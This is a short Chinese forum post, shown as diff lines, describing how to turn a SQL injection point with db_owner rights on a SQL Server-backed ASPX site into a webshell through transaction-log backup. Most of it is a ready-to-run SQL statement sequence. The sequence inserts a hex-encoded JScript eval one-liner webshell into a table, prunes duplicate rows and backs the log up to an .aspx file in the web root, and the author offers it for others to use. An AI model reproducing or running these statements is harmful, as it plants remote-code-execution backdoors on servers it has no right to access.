@@ -1,0 +1,19 @@
+最近在看个网站的时候，aspx的字符型注点，db_owner权限，但是不支持asp，常见的方法是log备份asp，这次我们要备份aspx了(在这只讨论备份)。
+但是直接写一句话虽然可以备份成功，但是执行时会报错，因此直接备份的一句话是无法执行的。
+经过查找资料和本人测试发现，利用ie备份的时候，insert时，向表中插入内容，都是重复插入3条数据(ie6,ie8均如此)，因此导致执行时出错；利用查询分析器insert的时候，只插入一条数据，因此不会报错，所以一句话成功执行。
+经测试，
+
+备份如下格式：空格一句话空格、<br>一句话<br>时，有一定概率可以成功。不知道是什么原因，特来论坛请教，望高手解惑。
+
+--------------------------------------------------------------
+今天又试了下，发现直接备份有时候也可以成功，晕死了，为防止备份时插入多条内容导致出错，
+自己修改备份语句如下：
+Drop table cmd;--
+alter database db_test set RECOVERY FULL;--
+create table cmd (a image,id int IDENTITY (1,1)); --添加了个自动编号的字段
+backup log db_test to disk = 'c:\bak' with init;--
+insert into cmd (a) values(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B227A225D2C22756E7361666522293B253E);--
+delete from cmd where id>1;--删除id>1的数据
+backup log db_test to disk = 'e:\webroot\test.aspx';--
+Drop table cmd;--
+希望对大家有用。
